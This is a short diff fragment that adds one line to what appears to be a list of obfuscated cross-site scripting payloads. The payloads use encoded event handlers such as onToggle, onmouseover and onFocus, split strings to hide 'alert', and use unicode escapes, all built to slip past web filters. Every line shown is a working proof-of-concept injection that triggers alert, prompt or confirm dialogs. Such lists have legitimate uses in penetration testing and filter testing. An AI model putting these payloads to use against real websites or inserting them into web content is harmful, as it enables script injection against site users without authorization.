@@ -4,6 +4,7 @@
 '<00 foo="<a%20href="javascript​:alert('XSS-Bypass')">XSS-CLick</00>--%20/
 <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
+<a%2Fonmouseover%3D(confirm)(document.URL)>a
 ';k='e'%0Atop['al'+k+'rt'](1)//
 “>-setTimeout`\u0028alert(1)\u0029`-’
 '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
